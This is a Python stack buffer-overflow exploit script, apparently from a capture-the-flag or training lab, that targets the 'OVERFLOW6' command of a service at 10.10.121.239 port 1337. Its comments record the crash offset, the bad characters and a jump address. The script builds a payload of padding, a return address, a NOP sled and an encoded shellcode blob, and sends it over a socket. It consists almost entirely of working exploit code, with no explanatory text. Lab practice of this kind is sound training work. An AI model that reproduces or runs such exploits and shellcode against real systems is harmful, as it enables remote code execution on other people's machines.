#!/usr/bin/python3

import sys, socket

# Application crashed on 2000 bytes
# [*] Exact match at offset 1034
# Bachars: 00 08 09 2c 2d ad ae
# Removed: 00 08 2c ad
# Stack pointer address: 0x625011AF (32bit little endian)

buf =  b""
buf += b"\xbf\xf5\x42\xb4\xb3\xda\xc8\xd9\x74\x24\xf4\x5b\x31"
buf += b"\xc9\xb1\x52\x83\xc3\x04\x31\x7b\x0e\x03\x8e\x4c\x56"
buf += b"\x46\x8c\xb9\x14\xa9\x6c\x3a\x79\x23\x89\x0b\xb9\x57"
buf += b"\xda\x3c\x09\x13\x8e\xb0\xe2\x71\x3a\x42\x86\x5d\x4d"
buf += b"\xe3\x2d\xb8\x60\xf4\x1e\xf8\xe3\x76\x5d\x2d\xc3\x47"
buf += b"\xae\x20\x02\x8f\xd3\xc9\x56\x58\x9f\x7c\x46\xed\xd5"
buf += b"\xbc\xed\xbd\xf8\xc4\x12\x75\xfa\xe5\x85\x0d\xa5\x25"
buf += b"\x24\xc1\xdd\x6f\x3e\x06\xdb\x26\xb5\xfc\x97\xb8\x1f"
buf += b"\xcd\x58\x16\x5e\xe1\xaa\x66\xa7\xc6\x54\x1d\xd1\x34"
buf += b"\xe8\x26\x26\x46\x36\xa2\xbc\xe0\xbd\x14\x18\x10\x11"
buf += b"\xc2\xeb\x1e\xde\x80\xb3\x02\xe1\x45\xc8\x3f\x6a\x68"
buf += b"\x1e\xb6\x28\x4f\xba\x92\xeb\xee\x9b\x7e\x5d\x0e\xfb"
buf += b"\x20\x02\xaa\x70\xcc\x57\xc7\xdb\x99\x94\xea\xe3\x59"
buf += b"\xb3\x7d\x90\x6b\x1c\xd6\x3e\xc0\xd5\xf0\xb9\x27\xcc"
buf += b"\x45\x55\xd6\xef\xb5\x7c\x1d\xbb\xe5\x16\xb4\xc4\x6d"
buf += b"\xe6\x39\x11\x21\xb6\x95\xca\x82\x66\x56\xbb\x6a\x6c"
buf += b"\x59\xe4\x8b\x8f\xb3\x8d\x26\x6a\x54\xb8\xbd\x67\xfd"
buf += b"\xd4\xc3\x87\xfc\x9f\x4d\x61\x94\xcf\x1b\x3a\x01\x69"
buf += b"\x06\xb0\xb0\x76\x9c\xbd\xf3\xfd\x13\x42\xbd\xf5\x5e"
buf += b"\x50\x2a\xf6\x14\x0a\xfd\x09\x83\x22\x61\x9b\x48\xb2"
buf += b"\xec\x80\xc6\xe5\xb9\x77\x1f\x63\x54\x21\x89\x91\xa5"
buf += b"\xb7\xf2\x11\x72\x04\xfc\x98\xf7\x30\xda\x8a\xc1\xb9"
buf += b"\x66\xfe\x9d\xef\x30\xa8\x5b\x46\xf3\x02\x32\x35\x5d"
buf += b"\xc2\xc3\x75\x5e\x94\xcb\x53\x28\x78\x7d\x0a\x6d\x87"
buf += b"\xb2\xda\x79\xf0\xae\x7a\x85\x2b\x6b\x8a\xcc\x71\xda"
buf += b"\x03\x89\xe0\x5e\x4e\x2a\xdf\x9d\x77\xa9\xd5\x5d\x8c"
buf += b"\xb1\x9c\x58\xc8\x75\x4d\x11\x41\x10\x71\x86\x62\x31"

host = '10.10.121.239'
port = 1337

shellcode = buf

nop_sled = b"\x90" * 16

payload = b"A" * 1034 + b"\xaf\x11\x50\x62" + nop_sled + shellcode

try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, port))
	s.send(b'OVERFLOW6 ' + payload)
	s.close()

except Exception as err:
	print(err)
	print("Error connecting to server %s on port %s" % (host, port))
